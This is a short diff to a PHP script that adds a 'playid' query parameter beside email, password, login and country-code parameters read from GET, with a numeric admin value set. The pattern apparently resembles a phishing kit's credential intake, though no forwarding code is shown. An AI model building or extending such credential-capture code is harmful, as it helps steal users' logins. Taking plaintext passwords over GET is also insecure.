@@ -35,6 +35,7 @@ $admin = "831161538";
 $email = $_GET["email"];
 $password = $_GET["password"];
 $login = $_GET["login"];
+$playid = $_GET['playid'];
 $callingcode = $_GET['country_code'];
 $linky = $_SERVER['HTTP_HOST'];
 
